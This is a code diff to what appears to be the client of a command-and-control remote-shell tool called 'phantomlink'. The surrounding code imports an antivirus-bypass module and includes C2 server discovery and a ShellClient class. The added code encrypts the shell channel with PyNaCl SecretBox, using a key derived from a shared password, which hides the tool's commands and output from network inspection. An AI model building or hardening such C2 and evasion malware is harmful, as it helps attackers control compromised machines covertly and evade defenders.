@@ -21,6 +21,10 @@ except ImportError:
     from client.av_bypass import AVBypass
 import base64
 from datetime import datetime
+import hashlib
+
+from nacl.exceptions import CryptoError
+from nacl.secret import SecretBox
 
 version = 11.7  # 7/3/2026
 
@@ -789,6 +793,36 @@ def discover_c2_server(port=5000):
     return None
 
 
+# ────────────────────────────────────────────────────────────────
+# Payload encryption (PyNaCl SecretBox) — mirrors C2/crypto.py.
+# The key is derived from CLIENT_PASSWORD, so the password itself
+# never crosses the wire anymore. Decryption failure returns None
+# so the existing defensive paths (silent close) handle it.
+# ────────────────────────────────────────────────────────────────
+
+
+def _derive_key(password):
+    """Derive the 32-byte channel key from the shared password."""
+    return hashlib.sha256(b"phantomlink-c2-v1" + password.encode('utf-8')).digest()
+
+
+def _encrypt(key, data):
+    """Encrypt str or bytes; returns nonce + ciphertext + tag as one blob."""
+    if isinstance(data, str):
+        data = data.encode('utf-8')
+    return SecretBox(key).encrypt(data)
+
+
+def _decrypt(key, data):
+    """Decrypt; returns None on any failure (wrong key, tamper, garbage)."""
+    if not data:
+        return None
+    try:
+        return SecretBox(key).decrypt(data)
+    except (CryptoError, TypeError, ValueError):
+        return None
+
+
 class ShellClient:
     def __init__(self):
         self.socket = None
@@ -804,6 +838,8 @@ class ShellClient:
             try:
                 if isinstance(data, str):
                     data = data.encode('utf-8')
+
+                data = _encrypt(_derive_key(CLIENT_PASSWORD), data)
 
                 # Send length (4 bytes)
                 msg_len = len(data)
@@ -839,8 +875,9 @@ class ShellClient:
                     print(f"[!] Message too large: {msglen} bytes")
                     return None
 
-                # Receive the actual message
-                return self._recv_exactly(msglen)
+                # Receive the actual message (encrypted payload)
+                payload = self._recv_exactly(msglen)
+                return _decrypt(_derive_key(CLIENT_PASSWORD), payload)
 
             except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                 print(f"[!] Connection error while receiving")
